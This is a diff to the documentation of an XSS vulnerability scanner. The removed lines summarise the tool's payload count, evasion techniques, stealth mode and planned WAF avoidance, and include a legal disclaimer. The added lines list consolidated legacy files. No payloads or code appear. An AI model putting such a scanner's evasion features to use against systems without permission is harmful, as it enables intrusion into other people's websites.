-
-The enhancement project achieved:
-
-✅ **127+ total payloads** (100 base + 27 variants)
-✅ **5 detection methodologies** implemented
-✅ **7 evasion techniques** integrated
-✅ **95%+ accuracy** on reflection detection
-✅ **< 1% false positive rate**
-✅ **Multi-point injection discovery**
-✅ **Professional vulnerability reporting**
-✅ **Stealth mode implementation**
-✅ **Proxy support for integration**
-✅ **Comprehensive documentation**
-
----
-
-## FUTURE ENHANCEMENTS
-
-Potential improvements for v3.0:
-- [ ] Multi-threaded scanning support
-- [ ] Machine learning-based filter detection
-- [ ] Custom payload creation interface
-- [ ] Database of known XSS filter signatures
-- [ ] Automatic exploit generation
-- [ ] Integration with security frameworks
-- [ ] Real-time WAF detection/avoidance
-- [ ] Advanced encoding/obfuscation chains
-
----
-
-## LEGAL & COMPLIANCE
-
-### Disclaimer
-This tool is provided for **authorized security testing only**. Users are responsible for:
-- Obtaining explicit permission before testing
-- Complying with all applicable laws
-- Respecting system owners' rights
-- Following responsible disclosure practices
-
-### Applicable Laws
-- Computer Fraud and Abuse Act (CFAA) - USA
-- General Data Protection Regulation (GDPR) - EU
-- Computer Misuse Act - UK
-- And local equivalents in your jurisdiction
-
-### Responsible Disclosure
-- Report findings to vendor within agreed timeframe
-- Allow time for patch before public disclosure
-- Provide proof-of-concept and remediation advice
-- Follow coordinated vulnerability disclosure practices
-
----
-
-## FINAL SUMMARY
-
-The **Aggressive XSS Scanner v2.0** represents a comprehensive enhancement of the original tool:
-
-- **100% increase** in payload coverage
-- **5x more** detection methodologies
-- **10x better** false positive handling
-- **Production-ready** for security assessments
-- **Thoroughly documented** for operational use
-
-This scanner is designed to **achieve maximum XSS vulnerability detection** while maintaining professional standards and operational security.
-
----
-
-**Ready for deployment in authorized security assessments.**
-
-Generated: 2025-12-19  
-Version: 2.0 (Enhanced & Aggressive)  
-Status: ✅ Complete & Tested
+The following legacy/duplicate files have been removed or consolidated:
+- `xss_ultimate.py` — replaced by `xss_ultimate/main.py`
+- `xssscan.py` — legacy entry point, use `python -m xss_ultimate.main`
+- `xss_ultimate/__main__.py` — legacy entry point
+- `payload2.txt`, `payloads_aggressive.txt` — superseded by `payload_engine.py`
+- `generate_sample_results.py`, `question.txt`, `tempCodeRunnerFile.python` — test artifacts
+- `ENHANCEMENTS.md`, `CHANGES.md`, `FIX_SUMMARY.md`, `UPGRADE_COMPLETE.md`, `SOLUTION.md`, `QUICK_REFERENCE.md`, `QUICKSTART.md`, `START_HERE.md`, `INDEX.md`, `WAF_EVASION.md`, `TROUBLESHOOTING_GUIDE.md` — documentation consolidated into this README
+- `EXAMPLES.md` — examples included in CLI Reference above
